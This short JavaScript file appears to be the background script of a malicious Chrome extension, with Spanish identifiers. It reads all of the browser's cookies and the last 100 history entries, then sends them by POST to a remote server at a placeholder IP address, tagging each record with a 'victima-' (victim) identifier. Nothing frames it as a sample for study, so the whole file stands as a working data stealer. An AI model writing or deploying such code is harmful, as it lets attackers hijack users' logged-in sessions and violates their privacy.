const SERVER_URL = "http://<IP>:5000/api/recibir";

function sendData(tipo, datos) {
  fetch(SERVER_URL, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      uuid: "victima-" + crypto.randomUUID(),
      tipo: tipo,
      datos: datos
    })
  });
}

chrome.cookies.getAll({}, function(cookies) {
  sendData("cookies", cookies);
});

chrome.history.search({text: '', maxResults: 100}, function(historyItems) {
  sendData("historial", historyItems);
});
